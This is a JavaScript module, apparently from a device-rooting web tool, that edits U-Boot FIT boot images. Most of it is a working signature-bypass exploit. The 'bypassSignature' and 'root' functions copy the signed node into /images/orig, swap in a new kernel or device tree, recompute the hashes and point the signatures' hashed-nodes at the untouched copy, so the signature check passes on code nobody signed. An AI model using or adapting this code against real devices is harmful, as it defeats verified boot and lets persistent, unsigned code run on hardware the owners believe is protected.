/**
 * FIT image operations: validation, DT model change, kernel replacement,
 * hash recalculation, signature removal.
 */

const FitOps = (() => {

  /**
   * CRC32 implementation (IEEE polynomial).
   */
  const crc32Table = (() => {
    const table = new Uint32Array(256);
    for (let i = 0; i < 256; i++) {
      let c = i;
      for (let j = 0; j < 8; j++) {
        c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
      }
      table[i] = c;
    }
    return table;
  })();

  function crc32(data) {
    let crc = 0xFFFFFFFF;
    for (let i = 0; i < data.byteLength; i++) {
      crc = crc32Table[(crc ^ data[i]) & 0xFF] ^ (crc >>> 8);
    }
    return (crc ^ 0xFFFFFFFF) >>> 0;
  }

  /**
   * SHA-256 via Web Crypto API (async).
   */
  async function sha256(data) {
    const hash = await crypto.subtle.digest('SHA-256', data);
    return new Uint8Array(hash);
  }

  /**
   * Decompress gzip data using DecompressionStream API.
   */
  async function gunzip(data) {
    const ds = new DecompressionStream('gzip');
    const writer = ds.writable.getWriter();
    writer.write(data);
    writer.close();
    const reader = ds.readable.getReader();
    const chunks = [];
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      chunks.push(value);
    }
    const totalLen = chunks.reduce((s, c) => s + c.byteLength, 0);
    const result = new Uint8Array(totalLen);
    let off = 0;
    for (const c of chunks) {
      result.set(c, off);
      off += c.byteLength;
    }
    return result;
  }

  /**
   * Validate a FIT image. Returns { valid, tree, images, error }.
   */
  function validate(buffer) {
    let tree;
    try {
      tree = FDT.parse(buffer);
    } catch (e) {
      return { valid: false, tree: null, images: [], error: e.message };
    }

    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) {
      return { valid: false, tree, images: [], error: 'No /images node found in FIT' };
    }
    if (imagesNode.children.length === 0) {
      return { valid: false, tree, images: [], error: 'No image entries under /images' };
    }

    const images = imagesNode.children.map(img => {
      const isOrig = img.name === 'orig';
      const type = isOrig ? 'exploit artifact' : (FDT.getStringProperty(img, 'type') || 'unknown');
      const desc = FDT.getStringProperty(img, 'description') || '';
      const data = FDT.getProperty(img, 'data');
      const size = data ? data.byteLength : 0;
      const compression = FDT.getStringProperty(img, 'compression') || 'none';
      return { name: img.name, type, description: desc, size, compression, isOrig };
    });

    const desc = FDT.getStringProperty(tree.root, 'description') || '';

    // Scan for signatures
    const signatures = [];
    const configsNode = FDT.findNode(tree.root, ['configurations']);
    if (configsNode) {
      for (const cfg of configsNode.children) {
        for (const child of cfg.children) {
          if (child.name.startsWith('signature')) {
            const algo = FDT.getStringProperty(child, 'algo') || 'unknown';
            signatures.push({ config: cfg.name, name: child.name, algo });
          }
        }
      }
    }
    const hasSignatures = signatures.length > 0;

    return { valid: true, tree, images, description: desc, signatures, hasSignatures, error: null };
  }

  /**
   * Find the flat_dt (device tree) image node under /images.
   */
  function findFdtImage(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return null;
    return imagesNode.children.find(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'flat_dt';
    }) || null;
  }

  /**
   * Find the kernel image node under /images.
   */
  function findKernelImage(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return null;
    return imagesNode.children.find(img => {
      const type = FDT.getStringProperty(img, 'type');
      return type === 'kernel' || type === 'kernel_noload';
    }) || null;
  }

  /**
   * Change the DT model property in the nested FDT image.
   * Parses the nested DTB, modifies the model, serializes it back.
   */
  function changeDtModel(tree, newModel) {
    const fdtImg = findFdtImage(tree);
    if (!fdtImg) {
      throw new Error('No flat_dt image found in FIT');
    }

    const dtData = FDT.getProperty(fdtImg, 'data');
    if (!dtData) {
      throw new Error('flat_dt image has no data property');
    }

    // Parse the nested DTB
    const innerTree = FDT.parse(dtData);

    // Modify the model property on the root node
    FDT.setProperty(innerTree.root, 'model', newModel);

    // Serialize back
    const newDtData = FDT.serialize(innerTree);

    // Replace data in the outer FIT
    FDT.setProperty(fdtImg, 'data', newDtData);

    // Update data-size if present
    const dataSizeProp = fdtImg.properties.find(p => p.name === 'data-size');
    if (dataSizeProp) {
      const buf = new ArrayBuffer(4);
      new DataView(buf).setUint32(0, newDtData.byteLength);
      dataSizeProp.data = new Uint8Array(buf);
    }
  }

  /**
   * Replace the kernel image data with new binary data.
   */
  function replaceKernel(tree, kernelData) {
    const kernelImg = findKernelImage(tree);
    if (!kernelImg) {
      throw new Error('No kernel image found in FIT');
    }

    FDT.setProperty(kernelImg, 'data', kernelData);

    // Update data-size if present
    const dataSizeProp = kernelImg.properties.find(p => p.name === 'data-size');
    if (dataSizeProp) {
      const buf = new ArrayBuffer(4);
      new DataView(buf).setUint32(0, kernelData.byteLength);
      dataSizeProp.data = new Uint8Array(buf);
    }
  }

  /**
   * Remove all signature nodes from under /images/* and /configurations/*.
   */
  function removeSignatures(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (imagesNode) {
      for (const img of imagesNode.children) {
        img.children = img.children.filter(c => !c.name.startsWith('signature'));
      }
    }

    const configsNode = FDT.findNode(tree.root, ['configurations']);
    if (configsNode) {
      for (const cfg of configsNode.children) {
        cfg.children = cfg.children.filter(c => !c.name.startsWith('signature'));
      }
    }
  }

  /**
   * Recalculate hashes for a single image node given its data.
   */
  async function recalcHashesForNode(node, data) {
    for (const hashNode of node.children) {
      if (!hashNode.name.startsWith('hash')) continue;

      const algo = FDT.getStringProperty(hashNode, 'algo');
      if (!algo) continue;

      if (algo === 'crc32') {
        const crcVal = crc32(data);
        const buf = new ArrayBuffer(4);
        new DataView(buf).setUint32(0, crcVal);
        FDT.setProperty(hashNode, 'value', new Uint8Array(buf));
      } else if (algo === 'sha256' || algo === 'sha-256') {
        const hashVal = await sha256(data);
        FDT.setProperty(hashNode, 'value', hashVal);
      } else if (algo === 'sha1' || algo === 'sha-1') {
        const hash = await crypto.subtle.digest('SHA-1', data);
        FDT.setProperty(hashNode, 'value', new Uint8Array(hash));
      } else if (algo === 'md5') {
        const prop = hashNode.properties.find(p => p.name === 'value');
        if (prop) prop.data = new Uint8Array(0);
      }
    }
  }

  /**
   * Recalculate hashes for all image nodes under /images.
   */
  async function recalculateHashes(tree) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) return;

    for (const img of imagesNode.children) {
      const data = FDT.getProperty(img, 'data');
      if (!data) continue;
      await recalcHashesForNode(img, data);
    }
  }

  /**
   * Rewrite hashed-nodes in signature nodes to point at /images/orig/<name>.
   */
  function fixupSignatures(tree, imageName) {
    const oldPrefix = `/images/${imageName}`;
    const newPrefix = `/images/orig/${imageName}`;

    const configsNode = FDT.findNode(tree.root, ['configurations']);
    if (!configsNode) return;

    const decoder = new TextDecoder();
    const encoder = new TextEncoder();

    for (const conf of configsNode.children) {
      for (const sig of conf.children) {
        if (!sig.name.startsWith('signature')) continue;

        const hashedData = FDT.getProperty(sig, 'hashed-nodes');
        if (!hashedData) continue;

        // Parse null-separated string list (trailing null)
        let raw = decoder.decode(hashedData);
        // Strip trailing nulls then split on null
        const entries = raw.replace(/\0+$/, '').split('\0');
        const newEntries = entries.map(e => {
          if (e === oldPrefix || e.startsWith(oldPrefix + '/')) {
            return newPrefix + e.slice(oldPrefix.length);
          }
          return e;
        });

        // Rejoin with null separators + trailing null
        const joined = newEntries.join('\0') + '\0';
        FDT.setProperty(sig, 'hashed-nodes', encoder.encode(joined));
      }
    }
  }

  /**
   * Signature bypass: clone original node, replace data, redirect signatures.
   */
  async function bypassSignature(tree, targetNodeName, newData) {
    const imagesNode = FDT.findNode(tree.root, ['images']);
    if (!imagesNode) throw new Error('No /images node');

    // Find target node
    const targetNode = imagesNode.children.find(c => c.name === targetNodeName);
    if (!targetNode) throw new Error(`Image node '${targetNodeName}' not found`);

    // Deep clone the original
    const original = FDT.cloneNode(targetNode);

    // Find or create /images/orig
    let origNode = imagesNode.children.find(c => c.name === 'orig');
    if (!origNode) {
      origNode = { name: 'orig', properties: [], children: [] };
      const targetIdx = imagesNode.children.indexOf(targetNode);
      imagesNode.children.splice(targetIdx + 1, 0, origNode);
    }

    // Add clone + sentinel if not already there
    if (!origNode.children.some(c => c.name === targetNodeName)) {
      origNode.children.push(original);
      if (!origNode.children.some(c => c.name === 'sentinel')) {
        origNode.children.push({ name: 'sentinel', properties: [], children: [] });
      }
    }

    // Replace data on original node
    FDT.setProperty(targetNode, 'data', newData instanceof Uint8Array ? newData : new Uint8Array(newData));

    // Set compression to none
    FDT.setProperty(targetNode, 'compression', 'none');

    // Append (Pwnd) to description
    const desc = FDT.getStringProperty(targetNode, 'description');
    if (desc !== null) {
      FDT.setProperty(targetNode, 'description', desc + ' (Pwnd)');
    }

    // Recalculate hashes for the modified node
    const data = FDT.getProperty(targetNode, 'data');
    await recalcHashesForNode(targetNode, data);

    // Redirect signature references
    fixupSignatures(tree, targetNodeName);
  }

  /**
   * Full rooting operation: modify DT model, replace kernel, bypass signatures, serialize.
   */
  async function root(buffer, options) {
    const result = validate(buffer);
    if (!result.valid) {
      throw new Error(result.error);
    }

    const tree = result.tree;
    const u8buf = buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer);

    // Resolve any external data references
    FDT.resolveExternalData(tree.root, u8buf);

    if (options.changeDtModel) {
      const fdtImg = findFdtImage(tree);
      if (!fdtImg) throw new Error('No flat_dt image found in FIT');
      let dtData = FDT.getProperty(fdtImg, 'data');
      if (!dtData) throw new Error('flat_dt image has no data property');

      // Decompress if compressed
      const compression = FDT.getStringProperty(fdtImg, 'compression') || 'none';
      if (compression === 'gzip') {
        dtData = await gunzip(dtData);
      }

      const innerTree = FDT.parse(dtData);
      FDT.setProperty(innerTree.root, 'model', 'rooted by ifitfitsisits.com');
      const newDtData = FDT.serialize(innerTree);

      await bypassSignature(tree, fdtImg.name, newDtData);
    }

    if (options.replaceKernel && options.kernelData) {
      const kernelImg = findKernelImage(tree);
      if (!kernelImg) throw new Error('No kernel image found in FIT');
      await bypassSignature(tree, kernelImg.name, new Uint8Array(options.kernelData));
    }

    return FDT.serialize(tree);
  }

  return {
    validate,
    root,
    crc32,
    sha256,
    findFdtImage,
    findKernelImage,
  };
})();
